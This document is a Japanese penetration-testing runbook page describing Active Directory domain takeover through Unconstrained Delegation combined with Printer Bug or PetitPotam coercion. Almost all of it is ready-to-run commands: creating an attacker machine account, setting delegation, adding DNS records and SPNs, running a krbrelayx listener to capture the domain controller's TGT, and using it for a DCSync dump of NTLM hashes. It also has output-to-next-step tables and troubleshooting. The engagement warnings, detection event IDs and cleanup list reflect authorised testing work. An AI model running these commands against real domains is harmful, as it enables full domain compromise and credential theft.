# Unconstrained Delegation + Printer Bug による TGT キャプチャ

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（Printer Bug 併用時に本番DCのスプーラーサービスへ影響）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（DNSレコード追加・SPN追加・コンピューターアカウント作成・Unconstrained Delegation 設定）
> - [x] SIEM/EDR で確実に検知される（Event ID 4769 / 4742 マシンアカウント変更 / 4741 マシンアカウント作成）
>
> 実施可否は事前合意で明示確認すること。追加した DNS レコード・SPN・コンピューターアカウントは原状回復必須。演習環境（HTB / OSCP 等）では制約なし。

> **スコープ**: `SeEnableDelegationPrivilege` を持つユーザー権限下での Unconstrained Delegation 設定 → Printer Bug / PetitPotam による DC の強制認証 → DC$ TGT キャプチャ → DCSync まで。DCSync の手順は `../Credential_Dumping.md` を参照。

## 着火条件

以下の**すべて**が満たされている場合：

1. `SeEnableDelegationPrivilege` を持つユーザーの権限がある（Unconstrained Delegation を設定できる）
2. DC 上で Print Spooler サービス、または MS-EFSRPC サービスが稼働している
3. DNS の書き込み権限がある（または既存アカウントに SPN を付与できる）

## 環境前提

- 実行環境: テスター端末（Linux）が主体。一部手順はターゲット上の Windows シェルからも可
- 必要なツール（Linux 側）:
  - `impacket-addcomputer`・`impacket-secretsdump`（ペネトレ用 Linux ディストリ標準搭載）
  - `bloodyAD`（要インストール: `pip install bloodyAD --break-system-packages`）
  - `krbrelayx` スイート（`dnstool.py`・`addspn.py`・`krbrelayx.py`・`printerbug.py`）（GitHub 要）
  - `PetitPotam.py`（GitHub 要）
- オフライン代替: Coercion ツールはインターネット不要だが事前に転送が必要

## 先に確認すること

- Print Spooler の状態確認:
  ```bash
  # [Attacker] nxc（NetExec）で確認
  netexec smb [DC_IP] -u '[USER]' -p '[PASSWORD]' -M spooler
  ```
- `SeEnableDelegationPrivilege` の確認（対象ユーザーの `whoami /priv` または BloodHound）

**攻撃者の思考トレース**: Unconstrained Delegation が設定されたコンピューターへ DC が認証すると、DC の TGT がそのコンピューターのメモリに保存される仕組みを利用する。Printer Bug（MS-RPRN）や PetitPotam（MS-EFSRPC）で DC を強制的に認証させることで、DC の TGT を奪い DCSync を実行する。

---

## 1. 攻撃用マシンアカウントの作成と Unconstrained Delegation 設定

**コマンド:**

```bash
# [Attacker] Step 1: 攻撃用コンピューターアカウントを作成
impacket-addcomputer \
  -computer-name '[CASE_ID]_ATTACKER$' \
  -computer-pass '[ATTACKER_CHOSEN_PASSWORD]' \
  -dc-ip [DC_IP] -domain [DOMAIN] -method SAMR \
  '[DOMAIN]/[USER]:[PASSWORD]'
```

```bash
# [Attacker] Step 2A: Unconstrained Delegation を設定（Linux から）
bloodyAD \
  -u '[USER]' -d '[DOMAIN]' -p '[PASSWORD]' \
  --host '[DC_IP]' \
  add uac '[CASE_ID]_ATTACKER$' -f TRUSTED_FOR_DELEGATION
```

```powershell
# [Target] Step 2B: Windows シェルがある場合の代替
Set-ADComputer [CASE_ID]_ATTACKER$ -TrustedForDelegation $True
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `Successfully added machine account [CASE_ID]_ATTACKER$` | マシンアカウント作成成功 | Step 2 の Unconstrained Delegation 設定に進む |
| `['TRUSTED_FOR_DELEGATION'] property flags added to [CASE_ID]_ATTACKER$'s userAccountControl` | Delegation 設定成功 | §2 DNS レコード + SPN の追加に進む |
| `LDAP_UNWILLING_TO_PERFORM` | `SeEnableDelegationPrivilege` が不足 | 前提条件を再確認 |

**注意:** bloodyAD は別途インストールが必要（`pip install bloodyAD --break-system-packages`）。

---

## 2. DNS レコードと SPN の追加（DC が Kerberos 認証できる準備）

**コマンド:**

```bash
# [Attacker] Step 3: 攻撃側マシンの DNS レコードを登録
python3 /path/to/krbrelayx/dnstool.py \
  -u '[DOMAIN]\[CASE_ID]_ATTACKER$' -p '[ATTACKER_CHOSEN_PASSWORD]' \
  -r [CASE_ID].[DOMAIN] \
  -d [ATTACKER_IP] \
  --action add [DC_IP]

# DNS 伝搬の確認（レコード追加後 最大 180 秒待つ）
dig [CASE_ID].[DOMAIN] @[DC_IP]
```

```bash
# [Attacker] Step 4: マシンアカウントに SPN を追加
python3 /path/to/krbrelayx/addspn.py \
  -u '[DOMAIN]\[USER]' -p '[PASSWORD]' \
  -s 'HOST/[CASE_ID].[DOMAIN]' \
  -t '[CASE_ID]_ATTACKER$' \
  [DC_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `Record added successfully` | DNS 登録成功 | `dig` で解決できるまで待機（最大 180 秒） |
| `[*] Updating SPN...` | SPN 追加成功 | §3 krbrelayx リスナーの起動に進む |
| `dig` で A レコードが返ってくる | DNS 伝搬完了 | §3 へ進む |

---

## 3. krbrelayx リスナーの起動と DC の強制認証

**事前準備（必須）:** `[ATTACKER_CHOSEN_PASSWORD]` を NT ハッシュに変換しておく。

```bash
# [Attacker] パスワードを NT ハッシュに変換
python3 -c "
import hashlib, binascii
password = '[ATTACKER_CHOSEN_PASSWORD]'
nt_hash = binascii.hexlify(hashlib.new('md4', password.encode('utf-16-le')).digest()).decode()
print(nt_hash)
"
```

**コマンド:**

```bash
# [Attacker] Step 5: krbrelayx リスナーを起動（別ターミナル）
# stdin が EOF で即終了するため tail -f /dev/null でパイプする
tail -f /dev/null | python3 /path/to/krbrelayx/krbrelayx.py \
  -hashes :[NT_HASH] \
  -ip [ATTACKER_IP] \
  -l /tmp/loot \
  -f ccache \
  -dc-ip [DC_IP] &
```

```bash
# [Attacker] Step 6A: printerbug.py で DC を強制認証（Print Spooler が有効な場合）
python3 /path/to/krbrelayx/printerbug.py \
  '[DOMAIN]/[USER]@[DC_FQDN]' \
  [CASE_ID].[DOMAIN]
```

```bash
# [Attacker] Step 6B: PetitPotam で DC を強制認証（Print Spooler が無効な場合）
python3 PetitPotam.py \
  -target-ip [DC_IP] \
  -u '[CASE_ID]_ATTACKER$' -p '[ATTACKER_CHOSEN_PASSWORD]' \
  [CASE_ID].[DOMAIN] [DC_FQDN]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| krbrelayx に `Got ticket for DC1$@[DOMAIN] [krbtgt@[DOMAIN]]` | TGT キャプチャ成功 | `/tmp/loot/` に `.ccache` が保存されているか確認 → §4 DCSync |
| `[+] Attack worked!` （PetitPotam） | 強制認証が成功 | krbrelayx リスナーのログを確認 |
| DC からのレスポンスがない | DNS 伝搬未完了 / Spooler 無効 | `dig` で DNS 確認 → 別の Coercion ツールを試す |

**注意:** Coercion は DC のサービスに直接影響する。本番では非業務時間帯に実施し、Spooler への負荷を最小限にする。

---

## 4. DC$ TGT を使って DCSync

**事前準備（必須）:** キャプチャした TGT ファイルのパスを確認する（`ls /tmp/loot/`）。

```bash
# [Attacker]
export KRB5CCNAME="/tmp/loot/DC1\$@[DOMAIN]_krbtgt@[DOMAIN].ccache"

impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -dc-ip [DC_IP] \
  'DC1$@[DC_FQDN]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `Administrator:500:...[NTLM_HASH]:::` | DCSync 成功 | `../Credential_Dumping.md` §2 Pass-The-Hash |
| `KRB_AP_ERR_SKEW` | 時刻ずれ | `sudo ntpdate [DC_IP]` で同期 |
| `KRB5KDC_ERR_TGT_REVOKED` | チケット期限切れ / 無効 | Coercion を再度実行して新しい TGT を取得 |

---

## 刺さらなかったとき

| 現象 | 原因 | 代替 |
|------|------|------|
| krbrelayx がすぐに終了する | stdin が EOF で終了 | `tail -f /dev/null \|` を先頭に追加してパイプする |
| DC が NTLM で接続してくる（Kerberos でない） | SPN が設定されていない | `bloodyAD get object '[CASE_ID]_ATTACKER$' --attr servicePrincipalName` で確認 |
| `PetitPotam` が `RPC_ACCESS_DENIED` + `[+] OK! Using unpatched function!` | 正常動作（特定の関数はパッチ済みだが別の関数で成立）| そのまま継続。TGT が届くか確認する |
| DNS が解決できない | レコード追加後の待機不足 | `dig [CASE_ID].[DOMAIN] @[DC_IP]` で確認。最大 180 秒待つ |
| `KRB_AP_ERR_SKEW` | 時刻ずれ | `sudo ntpdate [DC_IP]` |
| `TRUSTED_FOR_DELEGATION` が設定できない | `SeEnableDelegationPrivilege` なし | `whoami /priv` で再確認 |
| どの Coercion も応答しない | DC が強化済み（Spooler 無効・EFSRPC パッチ済み） | RBCD 攻撃（`./RBCD.md`）に切り替える |

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。本番 DC のスプーラーサービスを巻き込む可能性があり、業務影響と検知リスクが大きい
- **想定されるSIEM/EDR検知**:
  - Event ID 4741（コンピューターアカウント作成）
  - Event ID 4742（コンピューターアカウント変更：TrustedForDelegation 属性の変更）
  - Event ID 4769（Kerberos サービスチケット要求）
  - DNS 動的更新ログ（攻撃側が追加したレコード）
  - Defender for Identity の Unconstrained Delegation アラート
- **業務影響リスク**: パフォーマンス低下／部分的サービス停止リスク（Print Bug が本番 DC のスプーラーに対してエラーを起こす可能性）
- **原状回復必須項目**:
  - ✅ 作成したコンピューターアカウント（`[CASE_ID]_ATTACKER$` 等）の削除
  - ✅ 追加した DNS レコードの削除（`dnstool.py --action remove`）
  - ✅ 追加した SPN の削除（`addspn.py --remove`）
  - ✅ Unconstrained Delegation 属性のクリア（`bloodyAD remove uac '[CASE_ID]_ATTACKER$' -f TRUSTED_FOR_DELEGATION`）
  - ✅ `/tmp/loot/` 配下のチケットファイル（`.ccache`）の暗号化保管 → テスト完了時破棄
- **取得情報の取扱**: DC$ TGT は最高機密扱い。暗号化保管、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 関連：RBCD 攻撃（よりシンプルな委任攻撃）→ `./RBCD.md`
- 後：DC$ TGT で DCSync を実行 → `../Credential_Dumping.md`
